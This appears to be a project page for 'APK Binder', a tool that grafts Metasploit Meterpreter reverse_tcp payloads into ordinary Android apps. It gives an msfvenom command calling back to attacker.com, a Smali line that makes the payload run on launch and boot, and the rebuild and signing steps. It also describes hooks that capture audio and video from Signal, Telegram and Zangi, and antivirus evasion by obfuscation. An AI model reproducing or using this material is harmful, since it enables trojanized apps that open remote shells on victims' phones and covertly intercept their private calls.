APK Binder: Professional Android Binary Instrumentation Framework

SecurityAndroidSmaliMetasploitAPKTool

APK Binder is a professional-grade Android binary instrumentation suite that automates DEX bytecode injection and payload binding. Built during my research, it transforms standard APKs into persistent, stealthy tools by combining low-level Smali patching with a robust, AAPT2-compliant build pipeline.

Architecture

The framework operates in 4 phases:

Input APK → Decompile (APKTool) → Inject Smali → Recompile + Sign → Output APK
                                        ↓
                              Metasploit / Custom Payload

Key Features

1. Metasploit Payload Integration

Automated generation of Meterpreter reverse_tcp payloads using msfvenom, with a grafting system that merges Smali code into the target APK using Multi-Dex (smali_classesN) to avoid the 64K method limit.

msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=attacker.com LPORT=4444 -o payload.apk
apktool d target.apk -o target_dir
# Graft payload Smali into smali_classes3/

2. Custom Smali Injection

Automatic injection into onCreate methods and BroadcastReceivers to ensure payload execution on app launch and device boot.

invoke-static {p0}, Lcom/payload/Payload;->start(Landroid/content/Context;)V

3. Media Data Interception

Specialized hooks for apps like Signal, Telegram, Zangi to capture raw audio/video data by modifying WebRTC and media classes (AudioRecord, TextureView).

4. Antivirus Evasion

Global package renaming and class-path obfuscation to evade static analysis and mobile antivirus scanners.

5. Automated Build Pipeline

apktool b target_dir -o unsigned.apk
zipalign -f 4 unsigned.apk aligned.apk
apksigner sign --ks my.keystore \
  --ks-pass pass:android aligned.apk
